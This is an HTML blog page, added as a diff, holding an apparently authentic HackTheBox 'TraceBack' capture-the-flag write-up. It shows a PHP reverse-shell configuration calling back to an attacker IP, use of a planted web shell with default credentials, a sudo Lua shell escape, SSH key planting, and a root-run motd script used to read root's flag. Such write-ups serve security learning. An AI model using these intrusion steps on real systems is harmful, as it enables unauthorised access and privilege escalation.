@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+    <meta name="keywords" content="hexo, autumn" />
+    <title>
+        Hexo
+    </title>
+    <!-- favicon -->
+    
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/favicon.ico" />
+     
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- highlight -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/github-gist.min.css" />
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <script>
+        hljs.initHighlightingOnLoad()
+    </script>
+    <script src="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@2.0.0/dist/main.js"></script>
+
+    <script>
+        infiniteScroll()
+
+        window.addEventListener('DOMContentLoaded', function () {
+            const [
+                mainTitle,
+                mobileMenu,
+                mobileMainTitle,
+                mobileMenuBtn,
+                ipadMenuBtn,
+                aside,
+                closeBtn,
+            ] = getEle(
+                '#main-title',
+                '.mobile-menu',
+                '.mobile-menu h3',
+                '.mobile-menu button',
+                '.ipad-menu',
+                'aside',
+                'aside .close',
+            )
+            const io = new IntersectionObserver(entries => {
+                if (entries[0].intersectionRatio <= 0) {
+                    mobileMainTitle.classList.remove('invisibile')
+                } else {
+                    mobileMainTitle.classList.add('invisibile')
+                }
+            })
+            io.observe(mainTitle)
+
+            clickToggleAside(mobileMenuBtn)
+            clickToggleAside(ipadMenuBtn)
+            clickToggleAside(closeBtn, false)
+
+            const isMenuVisible = window.getComputedStyle(mobileMenu).display !== 'none'
+            if (isMenuVisible) document.body.style.background = 'none'
+
+            function getEle(...args) {
+                return args.map(arg => document.querySelector(arg))
+            }
+
+            function clickToggleAside(btn, show = true) {
+                btn.addEventListener('click', function () {
+                    if (show) {
+                        aside.style.display = 'block'
+                    } else {
+                        aside.style.display = 'none'
+                    }
+                })
+            }
+        })
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+    <div class="container">
+        <header class="header">
+    <nav class="mobile-menu" style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+        <h3 class="invisibile">
+            <a href="/" class="logo">
+                Hexo
+            </a>
+        </h3>
+        <button class="menu">menu</button>
+    </nav>
+
+    <button class="ipad-menu menu">menu</button>
+
+    <h1 class="title" id="main-title">
+        <a href="/" class="logo">
+            Hexo
+        </a>
+    </h1>
+    <h2 class="desc">
+        
+    </h2>
+
+    <div class="links">
+        <ul>
+            
+            <li>
+                <a href="https://github.com/FrontendSophie" target="_blank" rel="noopener">
+                    Github
+                </a>
+            </li>
+            
+            <li>
+                <a href="https://www.linkedin.com/in/frontendsophie/" target="_blank" rel="noopener">
+                    LinkedIn
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</header>
+        <main class="main">
+            <article class="post">
+    
+    
+    <h4 class="post-cat">
+        <a href="/category/Hackthebox/">
+            Hackthebox
+        </a>
+    </h4>
+    
+    
+    <h2 class="post-title">
+        HackTheBox TraceBack Writeup
+    </h2>
+    <ul class="post-date">
+        <li>
+            2020-05-01
+        </li>
+        <li>
+            M1nzhi
+        </li>
+    </ul>
+    <div class="post-content">
+        <h3 id="collection-of-information"><a href="#collection-of-information" class="headerlink" title="collection of information"></a>collection of information</h3><p>html comment maybe want to tell me somethings？</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/1.png" alt></p>
+<p>Google ： best web shells Xh4H，“Xh4H” is the name who create the machine.</p>
+<p>According to  Author’s twitter , I found a github repository named “web-shells”, and brute web directory using dirsearch</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/5.png" alt></p>
+<p>I found a php file named smevk.php  ,the default user and password of this phpshell is admin:admin</p>
+<h3 id="owned-user"><a href="#owned-user" class="headerlink" title="owned user"></a>owned user</h3><p> using “ code injector” to save a reverse_shell.php</p>
+<p>Reference: <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener">https://github.com/pentestmonkey/php-reverse-shell</a></p>
+<p><strong>changed</strong> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ Usage</span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">'10.10.16.90'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">4444</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>nc -lvp 4444, got shell</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/6.png" alt></p>
+<p>ls -ls /home/webadmin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">drwxr-x--- 5 webadmin sysadmin    4096 May  9 02:55 .</span><br><span class="line">drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..</span><br><span class="line">-rw------- 1 webadmin webadmin     593 May  9 02:26 .bash_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin     220 Aug 23  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin    3771 Aug 23  2019 .bashrc</span><br><span class="line">drwx------ 2 webadmin webadmin    4096 Aug 23  2019 .cache</span><br><span class="line">drwxrwxr-x 3 webadmin webadmin    4096 Aug 24  2019 .<span class="built_in">local</span></span><br><span class="line">-rw-rw-r-- 1 webadmin webadmin       1 Aug 25  2019 .luvit_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin     807 Aug 23  2019 .profile</span><br><span class="line">drwxrwxr-x 2 webadmin webadmin    4096 May  8 15:25 .ssh</span><br><span class="line">-rw-rw-r-- 1 sysadmin sysadmin     122 Mar 16 03:53 note.txt</span><br><span class="line">-rwxrwxr-x 1 webadmin webadmin 1156536 May  9 02:49 pspy64s</span><br><span class="line">-rw-rw-r-- 1 webadmin webadmin      28 May  8 15:39 run.lua</span><br></pre></td></tr></table></figure>
+
+<p><strong>cat note.txt</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- sysadmin -</span><br><span class="line">I have left a tool to practice Lua.</span><br><span class="line">I<span class="string">'m sure you know where to find it.</span></span><br><span class="line"><span class="string">Contact me if you have any question.</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>cat run.lua</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(<span class="string">"/bin/bash -i"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>cat .bash_history</strong></p>
+<p>webadmin excuted the following command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">nano privesc.lua</span><br><span class="line">sudo -u sysadmin /home/sysadmin/luvit privesc.lua </span><br><span class="line">rm privesc.lua</span><br><span class="line"><span class="built_in">logout</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/7.png" alt></p>
+<p>It looks like the “luvit” has sysadmin privilege. Attempt excute following command</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; run.lua</span><br><span class="line">sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit run.lua</span><br></pre></td></tr></table></figure>
+
+<p>bingo , owned sysadmin</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/8.png" alt></p>
+<h3 id="elevation-of-privilege"><a href="#elevation-of-privilege" class="headerlink" title="elevation of privilege"></a>elevation of privilege</h3><p>step1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/9.png" alt></p>
+<p>i tried elevate privilege using /bin/ping, but failed.I have no idea what to do next , so i decide to hanging out the forum. I comment “any dude rooted? I’m stucked on elevation,please do me a favor” </p>
+<p>Then , A generous man give me a hint:  use pspy, maybe you will find someting</p>
+<p>Alright, I’m going to download pspy on kali, and transfer to  traceback machine by following command</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/10.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 775 pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+
+<p>I found a CRON,  execute each 30 seconds</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2020/05/09 06:35:17 CMD: UID=0    PID=1      | /sbin/init noprompt </span><br><span class="line">2020/05/09 06:35:31 CMD: UID=0    PID=64249  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:36:01 CMD: UID=0    PID=64255  | sleep 30 </span><br><span class="line">2020/05/09 06:36:01 CMD: UID=0    PID=64252  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:36:01 CMD: UID=???  PID=64251  | ???</span><br><span class="line">2020/05/09 06:36:01 CMD: UID=0    PID=64250  | /usr/sbin/CRON -f </span><br><span class="line">2020/05/09 06:36:31 CMD: UID=0    PID=64256  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64262  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64261  | sleep 30 </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64260  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64259  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64258  | /usr/sbin/CRON -f </span><br><span class="line">2020/05/09 06:37:01 CMD: UID=0    PID=64257  | /usr/sbin/CRON -f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/10.png" alt></p>
+<p>what is <strong>update-motd.d?</strong> </p>
+<p>google搜到的资料看的不是很明白，只知道SSH登录的时候，会运行/etc/update-motd.d/目录的程序</p>
+<p>ls -la /etc/update-motd.d 可以看到00-header属于root用户，sysadmin用户组</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/11.png" alt></p>
+<p>00-header的作用是每次ssh登录的时候显示的banner</p>
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/12.png" alt></p>
+<p>kali上执行ssh-keygen生成ssh key，并将公钥保存到靶机的/home/webadmin/.ssh/authorized_keys</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrWV7VZQ6vaSoGaJcH8QIlgOU8KW+X/IURIB3NnxpPMdIsY27IbGcYDbLHv/P34R1uueTWg8Bx2buc/pFQw7oRk55sXgLD+cTnaHt8oRgtZJjsLAablxumQtSkcgrcc4UxQFmQ4hMud1nz0xhtbDJUpA/PFDNWt02xUxJpcAcezYwFx5fOt3Spf+EcNDpFj4AajLJ8rxmx7IXsrvdr86AftSTaya0v4+82esxdttOk2nddGrJXnKPUUdfqDaETAJvDA01aOxzj2Kib5eoYxd5F8xNImhtCNKUntwCBVZN+QvGdSurz0PAvEBm84WHgdEVIXu6QVBjTN6emC3bBYceyZzONw4Pw1/5RZWRe+7QITUl6Um/P7K6IV6oifF9elrb5Nz9IQwqEo1xnehrSKjgUP0VKBZm1j7/JHO8nMLoCJeA/EXtSChP18cTZN9jzpNd5B4kmMwX13bh6qLPGJLfmVtHfnSI8zM8JTb4yRdrgtjrEgv0s5jQ45PZGhlcEXH8= kali@kali &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令连接靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa webadmin@10.10.10.181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/13.png" alt></p>
+<p>可以看到， 欢迎信息：welcome to xh4H land ， 和 00-header是一样的</p>
+<p><strong>step1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"cat /root/root.txt"</span> &gt;&gt; 00-header</span><br></pre></td></tr></table></figure>
+
+<p><strong>step2</strong></p>
+<p>通过<code>ssh -i id_rsa webadmin@10.10.10.181</code> 重新登录靶机</p>
+<p>step1和step2之间的衔接操作一定要快，因为cron每30s 执行一次如下命令，会覆盖掉/etc/update-motd.d目录的所有文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/HackTheBox-TraceBack-Writeup/14.png" alt></p>
+<h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>这个靶机get到了新知识</p>
+<p>每次SSH成功登录的时候，会运行/update-motd.d/*所有的文件，而且运行账号是root</p>
+
+    </div>
+</article>
+        </main>
+        <aside class="aside">
+            <div class="close"></div>
+            <section class="aside-section">
+                
+    <h1>Categories</h1>
+
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/Hackthebox/">Hackthebox</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">安全运营</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a></li></ul>
+
+            </section>
+            <section class="aside-section">
+                
+    <h1>Archives</h1>
+
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li></ul>
+
+
+            </section>
+            <section class="aside-section tag">
+                
+    <h1>Tags</h1>
+
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="tag">-安全运营 -安全建设</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Challenge/" rel="tag">CTF Challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackThebox/" rel="tag">HackThebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">PHP代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SDL/" rel="tag">SDL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+
+            </section>
+        </aside>
+    </div>
+</body>
+
+</html>
